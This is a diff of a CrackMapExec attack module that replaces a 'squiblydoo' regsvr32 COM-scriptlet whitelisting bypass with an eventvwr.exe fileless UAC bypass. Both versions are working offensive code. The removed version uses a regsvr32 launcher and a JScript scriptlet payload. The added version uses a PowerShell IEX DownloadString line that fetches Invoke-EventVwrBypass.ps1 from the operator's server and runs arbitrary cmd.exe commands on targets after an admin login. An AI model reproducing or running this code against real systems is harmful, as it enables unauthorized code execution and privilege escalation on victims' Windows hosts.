@@ -1,23 +1,18 @@
-from cme.helpers import gen_random_string
+from cme.helpers import create_ps_command, get_ps_script
 from sys import exit
-import os
 
 class CMEModule:
 
     '''
-        Executes a command using a COM scriptlet to bypass whitelisting (a.k.a squiblydoo)
+        Executes a command using the the eventvwr.exe fileless UAC bypass
+        Powershell script and vuln discovery by Matt Nelson (@enigma0x3)
 
-        Based on the awesome research by @subtee
-
-        https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
-        http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
+        module by @byt3bl33d3r
     '''
 
-    name='com_exec' #Really tempted just to call this squiblydoo
+    name = 'eventvwr_bypass'
 
-    description = 'Executes a command using a COM scriptlet to bypass whitelisting'
-
-    required_server='http'
+    description = 'Executes a command using the eventvwr.exe fileless UAC bypass'
 
     chain_support = True
 
@@ -48,46 +43,32 @@ class CMEModule:
             with open(path, 'r') as cmdfile:
                 self.command = cmdfile.read().strip()
 
-        self.sct_name = gen_random_string(5)
-
     def launcher(self, context, command):
-        launcher = 'regsvr32.exe /u /n /s /i:http://{}/{}.sct scrobj.dll'.format(context.localip, self.sct_name)
-        return launcher
-    
-    def payload(self, context, command):
-        payload = '''<?XML version="1.0"?>
-<scriptlet>
-<registration
-    description="Win32COMDebug"
-    progid="Win32COMDebug"
-    version="1.00"
-    classid="{{AAAA1111-0000-0000-0000-0000FEEDACDC}}"
->
-<script language="JScript">
-    <![CDATA[
-        var r = new ActiveXObject("WScript.Shell").Run('{}');
-    ]]>
-</script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
-</scriptlet>'''.format(command)
+        launcher = '''
+        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-EventVwrBypass.ps1');
+        Invoke-EventVwrBypass -Force -Command "cmd.exe /c {command}";
+        '''.format(server=context.server,
+                   addr=context.localip,
+                   port=context.server_port,
+                   command=command)
 
-        context.log.debug('Generated payload:\n' + payload)
-        
-        return payload
+        return create_ps_command(launcher)
+
+    def payload(self, context, command):
+        with open(get_ps_script('Invoke-EventVwrBypass.ps1'), 'r') as ps_script:
+            return ps_script.read()
 
     def on_admin_login(self, context, connection, launcher, payload):
         connection.execute(launcher)
-        context.log.success('Executed squiblydoo')
+        context.log.success('Executed launcher')
 
     def on_request(self, context, request, launcher, payload):
-        if '{}.sct'.format(self.sct_name) in request.path[1:]:
+        if request.path[1:] == 'Invoke-EventVwrBypass.ps1':
             request.send_response(200)
             request.end_headers()
 
             request.wfile.write(payload)
+
             request.stop_tracking_host()
 
         else:
